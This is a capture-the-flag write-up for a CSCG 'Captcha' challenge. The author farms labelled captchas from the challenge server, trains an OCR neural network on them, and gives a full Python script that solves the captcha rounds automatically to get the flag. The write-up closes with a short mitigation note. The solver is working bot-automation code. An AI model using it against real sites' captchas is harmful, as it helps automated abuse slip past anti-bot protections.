# Captcha

**Author**: `Managarmr`

## Table of Contents

1. [Challenge](#1-challenge)
2. [Having a look](#2-having-a-look)
3. [Training a neural network](#3-training-a-neural-network)
4. [Mitigations](#4-mitigations)

## 1. Challenge

**Category**: `Misc`  
**Difficulty**: `Medium/Hard`  
**Author**: `LiveOverflow`  
**Description**:

"The Enrichment Center regrets to inform you that this next test is impossible.
Make no attempt to solve it. No one will blame you for giving up. In fact,
quitting at this point is a perfectly reasonable response."

http://hax1.allesctf.net:9200/

## 2. Having a look

Checking out the provided link we are indeed greeted with captchas - a few at
first, exploding into way too many very soon. We somehow need to solve the
captchas. The way the captchas are provided give us no information at all as
they are embedded into the page itself (`base64` encoded). Meaning they were
probably `PHP` generated. No metadata for us :(

The next best thing we could do is train a neural network. Using our favourite
search engine - `DuckDuckGo` - we cn quickly find an interesting `GitHub`
repository: https://github.com/emedvedev/attention-ocr

This seems to be exactly what we need.

## 3. Training a neural network

Using the repository training the network is straight forward enough - except it
isn't. We have to setup `python2` with a specific `tensorflow` version, but
after doing so it really is straight forward.

We need training datasets, luckily the `Captcha` service provides the solution
for us allowing for easy farming:

```python
image_regex = re.compile(r'iV[\w\=\+\/]+')
solution_regex = re.compile(r'<b>([0-9A-Za-z]+)</b>')

def farm_captcha():
	s = requests.Session()
	resp_1 = s.get('http://hax1.allesctf.net:9200/captcha/0')
	resp_2 = s.post('http://hax1.allesctf.net:9200/captcha/0', data={0: 'FARMING'})

	return image_regex.findall(resp_1.text)[0], solution_regex.findall(resp_2.text)[0]
```

After training the network overnight (Adjustments to `max-width` and
`max-prediction` were needed) we have a network which reliably solves the
captchas.

Using a tensorflw model server we can spin up a docker container and complete
our script:

```python
#!/usr/bin/env python3

import json
import os
import re
import requests
import time

from base64 import b64decode

fdir = os.path.dirname(os.path.realpath(__file__)) + '/testing2/'

image_regex = re.compile(r'iV[\w\=\+\/]+')
solution_regex = re.compile(r'<b>([0-9A-Za-z]+)</b>')

def farm_captcha():
	s = requests.Session()
	resp_1 = s.get('http://hax1.allesctf.net:9200/captcha/0')
	resp_2 = s.post('http://hax1.allesctf.net:9200/captcha/0', data={0: 'FARMING'})

	return image_regex.findall(resp_1.text)[0], solution_regex.findall(resp_2.text)[0]

def predict(captcha):
	resp = requests.post('http://localhost:8501/v1/models/aocr:predict', json={
		'signature_name': 'serving_default',
		'inputs': {
			'input': {
				'b64': captcha
			}
		}})
	
	ret = json.loads(resp.text)
	return ret['outputs']

def solve():
	url = 'http://hax1.allesctf.net:9200/captcha/0'
	s = requests.Session()

	response = s.get(url)
	while 'fail' not in url:
		print(f'URL: {url}')

		if '4' in url:
			flag = image_regex.findall(response.text)[0]
			flag_file = open('flag.png', 'wb')
			flag_file.write(b64decode(flag))
			flag_file.close()
			break

		solutions = {}
		captchas = image_regex.findall(response.text)
		for i, captcha in enumerate(captchas):
			solutions[i] = predict(captcha)['output']
		
		print(solutions)
		response = s.post(url=url, data=solutions)
		url = response.url
		
solve()
```

Resulting in us getting the flag `CSCG{Y0UR_B0T_S0LV3D_THE_CAPTCHA}`:

![Flag](flag.png)

## 4. Mitigations

The best mitigation is not using a custom captcha service, just use `ReCaptcha`
or whatever - the risk analysis involved there is far superior to any regular
captcha.
